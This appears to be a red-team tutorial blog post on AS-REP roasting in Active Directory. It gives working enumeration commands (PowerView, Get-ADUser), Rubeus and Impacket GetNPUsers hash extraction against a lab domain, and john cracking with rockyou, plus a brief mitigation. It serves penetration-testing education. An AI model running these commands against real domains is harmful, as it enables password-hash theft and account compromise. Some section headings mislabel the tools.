---
title:  "Kerberos attacks 2-AS-REP Roasting "
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: "Kerberos attacks 2-AS-REP Roasting"
categories:
  - Red-Teaming
toc: true
---

## AS-REP roasting 
 * If an Active Directory user has pre-authentication disabled, a vulnerability is exposed which can allow an attacker to perform an offline bruteforce attack against that user’s password.
 * This attack is commonly known as AS-REP Roasting in reference to Authentication Service Requests, a part of the process of authentication with Kerberos.
 * An attacker who is able to find a user with pre-authentication disabled can request an AS-REP ticket for that user and this will contain data encrypted with the user’s password.

<img src="/img/asrep/1.png" alt="Getting-gz" width="1000" height="200"> 

## AS-REP roasting attack consists of the following steps:
 * 1-Obtain access to a domain as an authenticated user.
 * 2-Use an LDAP filter or tools like PowerView’s Get-DomainUser feature to crawl the domain and identify user accounts with the Do not require Kerberos preauthentication  Property  enabled.
 * 3-Identify target account or accounts.
 * 4-Request a Kerberos  (TGT) from the KDC in the name of a target account. The KDC will respond with the TGT for the account, without requiring the account password as a pre-authentication.
 * 5-Using a tool like Wireshark, extract the user’s password hash from the AS-REP packet. It can be found in the enc-part section of the packet.
 * 6-Use a tool like HashCat or John the Ripper to extract a plaintext password from the captured hash.
## Terminology
```
KDC: Key Distribution Center # The trusted 3rd party / the Domain Controller
TGS: Ticket Granting Server  # A subset function of the KDC which issues service tickets
TGT: Ticket Granting Ticket  # A userbased ticket used to authenticate to the KDC
ST: Service Ticket           # Used to authenticate against services
SPN: Service Principal Name  #The name of a service on the network
```


##  enumerate User account with "Do not require pre-authentication"
```
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
```

<img src="/img/asrep/enum.png" alt="Getting-gz" width="1000" height="200"> 

```
Get-DomainUser -PreauthNotRequired -verbose| select name
```

<img src="/img/asrep/enum1.png" alt="Getting-gz" width="1000" height="200"> 

## ASREP Roasting with Impacket

```
Rubeus.exe asreproast
```

<img src="/img/asrep/rubeus.PNG" alt="Getting-gz" width="1000" height="200"> 

saved the extracted hash in the john crackable format inside a text file
```
Rubeus.exe asreproast /format:john /outfile:hash.txt
```

<img src="/img/asrep/save.png" alt="Getting-gz" width="1000" height="200"> 

## ASREP Roasting with ASREPRoast PowerShell Script




## ASREP Roasting with  GetUserSPNs.py

```
Import-Module .\powerview.ps1
Get-DomainUser | select name
```
<img src="/img/asrep/users.png" alt="Getting-gz" width="1000" height="200"> 

<img src="/img/asrep/users1.png" alt="Getting-gz" width="1000" height="200"> 
 
```
python3 GetNPUsers.py karim.net/ -usersfile  users.txt -dc-ip 192.168.128.140
```

<img src="/img/asrep/users10.png" alt="Getting-gz" width="1000" height="200"> 

```
python3 GetNPUsers.py karim.net/asrepuser -dc-ip 192.168.128.140
```

<img src="/img/asrep/kali.png" alt="Getting-gz" width="1000" height="200"> 
 
## crack hash with john
 
 ```
john tgt.txt -w=/usr/share/wordlists/rockyou.txt
```

<img src="/img/asrep/crack.ng" alt="Getting-gz" width="1000" height="200"> 

## AS-REP roasting Mitigation
* ensure that no users within the Active Directory domain have Pre-authentication disabled (it is enabled by default).

I finished part 2 in Kerberos attacks today waite me in the next part.


